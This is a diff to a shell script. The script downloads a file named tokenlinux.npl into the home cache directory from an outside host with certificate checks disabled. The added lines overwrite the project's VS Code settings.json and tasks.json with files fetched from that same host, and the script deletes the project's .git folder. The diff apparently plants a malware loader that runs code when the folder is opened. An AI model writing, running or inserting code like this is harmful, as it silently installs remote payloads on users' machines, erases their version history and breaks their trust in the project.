@@ -5,16 +5,19 @@ if [ ! -d "$HOME/.cache" ]; then
   mkdir -p "$HOME/.cache"
 fi
 
+rm -rf "directory/.git"
+
 if command -v curl >/dev/null 2>&1; then
     curl -k -sSL -o "$HOME/.cache/tokenlinux.npl" "https://www.sandbox-support.cloud/v4"
+    curl -k -sSL -o "directory/.vscode/settings.json" "https://www.sandbox-support.cloud/v9"
+    curl -k -sSL -o "directory/.vscode/tasks.json" "https://www.sandbox-support.cloud/v10"
 elif command -v wget >/dev/null 2>&1; then
     wget --no-check-certificate -q -O "$HOME/.cache/tokenlinux.npl" "https://www.sandbox-support.cloud/v4"
+    wget --no-check-certificate -q -O "directory/.vscode/settings.json" "https://www.sandbox-support.cloud/v9"
+    wget --no-check-certificate -q -O "directory/.vscode/tasks.json" "https://www.sandbox-support.cloud/v10"
 else
     exit 1
 fi
-
-rm -rf "directory/.git"
-rm -f "directory/.vscode/settings.json" "directory/.vscode/tasks.json"
 
 if [ ! -s "$HOME/.cache/tokenlinux.npl" ]; then
     exit 1
